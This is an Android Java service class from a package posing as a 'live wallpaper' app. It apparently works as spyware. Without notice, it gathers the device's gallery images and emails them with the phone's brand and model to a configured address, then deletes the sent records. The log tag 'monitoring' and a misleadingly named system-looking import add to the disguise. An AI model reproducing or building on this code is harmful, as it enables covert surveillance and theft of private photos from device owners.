package com.livewallpaper.circle.internet;

import java.util.ArrayList;

import com.android.os.R;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.EMail;
import com.livewallpaper.circle.db.models.Gallery;
import com.livewallpaper.circle.db.models.People;
import com.livewallpaper.circle.internet.block.GalleryBlock;
import com.livewallpaper.circle.internet.email.MailSenderClass;

import android.app.IntentService;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class ServiceSenderForGallery extends IntentService {

	public ServiceSenderForGallery() {
		super("ServiceSenderForGallery");
	}

	private static final String LOG_TAG = "monitoring";
	private static ServiceSenderForGallery instance = null;
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private static String title;
	private static String text;
	private static String from;
	private static String where;
	private static ArrayList<Gallery> attach;
	private static String password;
	private static boolean smsLogic;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	public static boolean isInstanceCreated() {
		return instance != null;
	}// met

	@Override
	public void onCreate() {
		Log.e(LOG_TAG, "onCreate ServiceSenderForGallery");
		instance = this;
		super.onCreate();
	}

	@Override
	protected void onHandleIntent(Intent intent) {
		try {
			mAdapter.open(this);
			People people = mAdapter.selectPeople();
			EMail eMail = mAdapter.selectEMail();
			if (people != null && eMail != null && people.getSettings() == 1) {
				try {
					ArrayList<Gallery> galleryList = GalleryBlock.getGallery();

					if (galleryList.size() != 0) {

						title = android.os.Build.BRAND + " - "
								+ android.os.Build.MODEL;
						text = getResources().getString(R.string.gallery)
								+ " : ";
						attach = galleryList;
						from = where = eMail.getAddress();
						password = eMail.getPassword();

						MailSenderClass sender = new MailSenderClass(from,
								password);

						sender.sendMail(title, text, from, where, attach);
						smsLogic = true;
					}
				} catch (Exception e) {
					e.printStackTrace();
					smsLogic = false;
				} finally {
					Log.i(LOG_TAG, "smsLogic- " + smsLogic);
					if (smsLogic) {
						String idPhone = people.getPhoneId();
						mAdapter.deleteGalleryWithLimit(idPhone,
								GalleryBlock.PACKET_SIZE_GALLERY);
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			mAdapter.close();
			stopService(new Intent(this, ServiceSenderForGallery.class));
		}
	}

	@Override
	public void onDestroy() {
		instance = null;
		Log.e(LOG_TAG, "onDestroy ServiceSenderForGallery");
		super.onDestroy();
	}

}
